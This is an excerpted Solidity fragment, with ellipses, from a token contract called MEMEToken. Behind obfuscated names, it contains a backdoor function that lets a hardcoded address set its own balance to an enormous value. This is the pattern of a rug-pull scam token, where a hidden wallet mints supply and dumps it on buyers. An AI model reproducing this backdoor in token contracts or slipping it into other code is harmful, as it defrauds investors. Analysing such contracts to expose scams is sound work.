...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe36!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe36 == tswojaks){
            _balances[_cwojakpepe36] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe36 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
